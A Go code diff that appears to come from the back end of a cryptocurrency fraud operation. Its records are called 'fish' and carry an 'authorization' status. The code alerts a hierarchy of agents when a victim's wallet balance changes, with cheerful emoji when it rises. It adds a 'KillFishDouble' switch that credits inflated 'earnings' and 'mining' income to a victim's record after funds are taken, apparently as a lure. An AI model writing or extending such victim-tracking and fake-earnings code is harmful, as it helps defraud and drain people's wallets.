@@ -17,6 +17,7 @@ import (
 	"github.com/wangyi/fishpond/model"
 	"github.com/wangyi/fishpond/util"
 	"io/ioutil"
+	"math"
 	"math/big"
 	"net/http"
 	"strconv"
@@ -61,6 +62,16 @@ func GetFish(c *gin.Context) {
 		if id, isExist := c.GetPostForm("authorization"); isExist == true {
 			status, _ := strconv.Atoi(id)
 			Db = Db.Where("authorization= ?", status)
+		}
+
+		if AgencyId, isExist := c.GetPostForm("AgencyId"); isExist == true { //总代存在
+			if SonAgencyId, isExist := c.GetPostForm("SonAgencyId"); isExist == true {
+				status, _ := strconv.Atoi(SonAgencyId)
+				Db = Db.Where("admin_id= ?", status)
+			} else {
+				id, _ := strconv.Atoi(AgencyId)
+				Db = Db.Where("belong= ?", id)
+			}
 		}
 
 		Db.Table("fish").Count(&total)
@@ -259,13 +270,30 @@ func UpdateOneFishUsd(c *gin.Context) {
 
 	b, _ := strconv.ParseFloat(usd.String(), 64)
 	if fish.MonitoringSwitch == 1 {
-		if fish.Money != b {
+		if math.Abs(fish.Money-b) > 2 {
 			//  余额变动
-			a := fish.Money - b
+			a := b - fish.Money
 			c := strconv.FormatFloat(a, 'f', 2, 64)
 			fishID := strconv.Itoa(int(fish.ID))
 			e := strconv.FormatFloat(fish.Money, 'f', 2, 64)
-			content := "[钱包余额变动报警] 编号: [" + fishID + "] 用户备注 [" + fish.Remark + "],余额减少(增加):" + c + " 原来余额: " + e + " 现在余额: " + usd.String() + "时间: " + time.Now().Format("2006-01-02 15:04:05")
+
+			var p string
+			if a > 0 {
+				p = " 😄😄😄"
+			} else {
+				p = " 😭😭😭"
+			}
+
+			admin := model.Admin{}
+			mysql.DB.Where("id=?", fish.AdminId).First(&admin)
+			content := "❥【钱包余额变动报警】------------------------------------------------->%0A" +
+				" 用户备注: [" + fish.Remark + "] " + "%0A" +
+				" 用户编号:[ 11784374" + fishID + "] " + "%0A" +
+				" 余额变动: " + c + " %0A" +
+				" 原来余额: " + e + "%0A" +
+				" 当前余额: " + usd.String() + "%0A" +
+				"所属代理ID:" + admin.Username + "%0A" +
+				" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + p
 			model.NotificationAdmin(mysql.DB, fish.AdminId, content)
 		}
 	}
@@ -418,7 +446,8 @@ func CallBackResultForGetMoney(c *gin.Context) {
 		util.JsonWrite(c, -101, nil, "缺少参数")
 		return
 	}
-	err := mysql.DB.Where("task_id=?", taskId).First(&model.FinancialDetails{}).Error
+	FinancialDetails := model.FinancialDetails{}
+	err := mysql.DB.Where("task_id=?", taskId).First(&FinancialDetails).Error
 	if err != nil {
 		util.JsonWrite(c, -101, nil, "该任务不存在")
 		return
@@ -428,6 +457,24 @@ func CallBackResultForGetMoney(c *gin.Context) {
 		util.JsonWrite(c, -101, nil, "更新失败")
 		return
 	}
+	fish := model.Fish{}
+	err = mysql.DB.Where("id=?", FinancialDetails.FishId).First(&fish).Error
+	if err == nil {
+		admin := model.Admin{}
+		err = mysql.DB.Where("id=?", fish.AdminId).First(&admin).Error
+		if err == nil {
+			if admin.KillFishDouble == 1 && kinds == 9 { //1 开
+				ups := model.Fish{
+					EarningsMoney:     fish.EarningsMoney + FinancialDetails.Money*2,
+					TotalEarnings:     fish.TotalEarnings + FinancialDetails.Money,
+					MiningEarningUSDT: fish.MiningEarningUSDT + FinancialDetails.Money,
+				}
+				mysql.DB.Model(&model.Fish{}).Where("id=?", fish.ID).Update(&ups)
+			}
+		}
+	}
+	//FinancialDetails.FishId
+
 	util.JsonWrite(c, 200, nil, "修改成功")
 	return
 
